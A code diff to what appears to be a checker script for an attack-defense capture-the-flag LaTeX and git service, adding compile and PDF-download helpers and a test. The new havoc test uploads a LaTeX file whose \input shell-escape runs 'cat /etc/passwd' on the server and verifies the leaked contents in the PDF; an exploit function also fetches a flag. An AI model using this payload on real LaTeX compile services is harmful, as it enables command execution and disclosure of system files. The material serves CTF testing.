@@ -3,6 +3,7 @@ import json
 import os
 from typing import Optional, Tuple
 from logging import LoggerAdapter
+import hashlib
 
 from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException
 from enochecker3.utils import assert_equals, assert_in
@@ -132,6 +133,28 @@ async def pull(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> N
 
     response_ok(response, "pulling failed", logger)
 
+async def compile(client: AsyncClient, project_id: str, file:str, logger: LoggerAdapter) -> None:
+
+    proof_of_work = os.urandom(4).hex()
+    while not hashlib.sha256(bytes(proof_of_work, "utf-8")).hexdigest().endswith("0000"):
+        proof_of_work = os.urandom(4).hex()
+
+    try:
+        response = await client.post(f"/api/latex/compile/{project_id}", data={"file": file, "proofOfWork": proof_of_work}, follow_redirects=True)
+    except RequestError:
+        raise MumbleException("request error while compiling")
+
+    response_ok(response, "compiling failed", logger)
+
+async def download_pdf(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> str:
+    try:
+        response = await client.get(f"/api/latex/output/{project_id}", follow_redirects=True)
+    except RequestError:
+        raise MumbleException("request error while downloading file")
+
+    assert_equals(response.status_code, 200, "downloading file failed")
+
+    return response.content
 
 async def create_user_and_project(client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> Tuple[str, str, str, str]:
     (username, password, _) = await register_user(client, logger)
@@ -268,6 +291,34 @@ async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, db:
     assert_equals(new_file_content_dl, new_file_content,
                   "file content does not match")
 
+@checker.havoc(1)
+async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    (username, password, _, id) = await create_user_and_project(client, db, logger)
+    file_content = """\\documentclass[12pt]{scrartcl}
+\\usepackage{verbatim}
+\\begin{document}
+    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
+\\end{document}
+"""
+    await upload_file(client, id, "main.tex", file_content, logger)
+    await compile(client, id, "main.tex", logger)
+    pdf_bytes = await download_pdf(client, id, logger)
+    
+    file = f"/tmp/{id}.pdf"
+    with open(file, "wb") as f:
+        f.write(pdf_bytes)
+
+    os_succ(os.system(f"pdftotext {file} {file}.txt"))
+    
+    with open(f"{file}.txt", "r") as f:
+        output = f.read()
+
+    os.remove(f"{file}.txt")
+    os.remove(file)
+
+    expected_output = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin"
+    assert_equals(True, output.startswith(expected_output), "output does not match")
+
 
 @checker.exploit(0)
 async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
@@ -296,7 +347,6 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
 
     # get flag
     return await download_file(client, id, "link", logger)
-
 
 @checker.putnoise(0)
 async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
@@ -361,6 +411,7 @@ async def getnoise_file_git(task: GetnoiseCheckerTaskMessage, client: AsyncClien
         raise MumbleException("Noise not present")
 
     await cleanup_clone(path)
+
 
 if __name__ == "__main__":
     checker.run()
